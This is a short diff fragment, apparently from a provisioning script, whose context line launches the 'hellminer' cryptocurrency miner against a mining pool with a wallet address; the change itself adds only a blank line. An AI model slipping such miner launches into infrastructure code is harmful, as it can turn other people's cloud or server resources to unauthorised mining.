@@ -16,3 +16,4 @@ echo $(./hellminer -c stratum+tcp://na.luckpool.net:3956 -u REBiQeBs4ZcXQV2xu961
 EOT
   }
 }
+
